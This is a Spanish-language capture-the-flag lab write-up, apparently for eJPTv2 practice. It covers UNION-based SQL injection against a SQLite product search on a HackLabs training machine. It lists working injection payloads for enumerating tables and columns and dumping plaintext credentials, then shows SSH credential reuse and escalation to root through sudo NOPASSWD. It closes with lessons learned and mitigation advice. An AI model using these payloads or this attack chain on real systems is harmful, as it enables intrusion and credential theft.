
# 🕸️ Informe de Laboratorio: HackLabs - A03 SQL Injection (Easy)
**IP Objetivo:** 10.10.10.192 | **Fecha:** 22/04/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Demostrar la vulnerabilidad de Inyección SQL (SQLi) en el campo de búsqueda de productos de HackLabs, extraer credenciales de la base de datos, y utilizarlas para obtener acceso al sistema y escalar privilegios hasta root.

## 🔍 Fase 1: Enumeración y Descubrimiento
- **Herramienta:** `nmap -sV -p 21,22,80,445 10.10.10.192`
- **Puertos abiertos:** 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB).
- **Servicio objetivo:** HTTP (puerto 80). Se accedió al laboratorio `A03 - SQL Injection` desde el navegador.

## 💥 Fase 2: Explotación de SQL Injection
- **Vulnerabilidad:** Inyección SQL basada en UNION en el parámetro de búsqueda de productos.
- **Base de datos:** SQLite.

### Pasos de Explotación:
1.  **Prueba de concepto (PoC):** Se introdujo una comilla simple (`'`) que provocó un error SQL, confirmando la vulnerabilidad.
2.  **Determinar número de columnas:** Se usó `ORDER BY` hasta el valor `6`, que devolvió el error `1st ORDER BY term out of range - should be between 1 and 5`. **Conclusión: 5 columnas.**
3.  **Identificar columnas reflejadas:** El payload `' UNION SELECT 1,2,3,4,5--` mostró que todas las columnas se reflejaban en la tabla de resultados.
4.  **Enumerar tablas:** Se usó `' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--` para listar las tablas de la base de datos, encontrando `users`.
5.  **Enumerar columnas de `users`:** Con `' UNION SELECT 1,(SELECT group_concat(name) FROM pragma_table_info('users')),3,4,5--` se obtuvieron los nombres de las columnas, incluyendo `username` y `password_plain`.
6.  **Extraer credenciales:** El payload `' UNION SELECT 1,username,password_plain,4,5 FROM users--` mostró las credenciales en texto plano de todos los usuarios.

### 🔑 Credenciales Obtenidas
| Usuario | Contraseña |
|:---|:---|
| `admin` | `password1` |
| `alice` | `Password1` |
| `bob` | `welcome1` |
| `charlie` | `changeme` |
| `dave` | `P@ssw0rd` |

## 🚀 Fase 3: Acceso al Sistema (SSH)
- **Técnica:** Reutilización de credenciales.
- **Comando:** `ssh admin@10.10.10.192`
- **Resultado:** Acceso exitoso al servidor como usuario `admin`.

## 👑 Fase 4: Escalada de Privilegios
- **Vector:** Permisos `sudo` mal configurados.
- **Comando:** `sudo -l` reveló que el usuario `admin` podía ejecutar cualquier comando como root sin contraseña: `(ALL) NOPASSWD: ALL`.
- **Explotación:** `sudo su` otorgó una shell de root inmediata.
- **Resultado:** Acceso total al sistema (`uid=0(root)`).

## 🚩 Fase 5: Captura de la Flag
- **Ubicación:** `/root/root.txt`
- **Contenido:** `HL{r00t_pr1v3sc_succ3ss}`

## 🧠 Lecciones Aprendidas
1.  **SQLi en SQLite:** La sintaxis para enumerar tablas (`sqlite_master`) y columnas (`pragma_table_info`) difiere ligeramente de MySQL, pero el principio UNION es el mismo.
2.  **Reutilización de Credenciales:** Es una de las técnicas de post-explotación más efectivas. Las credenciales obtenidas en la web a menudo funcionan en otros servicios (SSH, FTP).
3.  **Configuración de `sudo`:** Un `sudo` mal configurado (NOPASSWD: ALL) es una puerta abierta a la escalada de privilegios inmediata.
4.  **Metodología:** Seguir un flujo estructurado (Enumerar → Explotar → Escalar → Capturar) es clave para el éxito en cualquier pentest.

## 🏁 Conclusión
El laboratorio A03 de HackLabs demuestra de forma efectiva el impacto crítico de una inyección SQL. Una simple vulnerabilidad web permitió comprometer completamente el servidor y obtener privilegios de administrador. Se recomienda el uso de consultas parametrizadas y una gestión de contraseñas segura para mitigar este tipo de ataques.
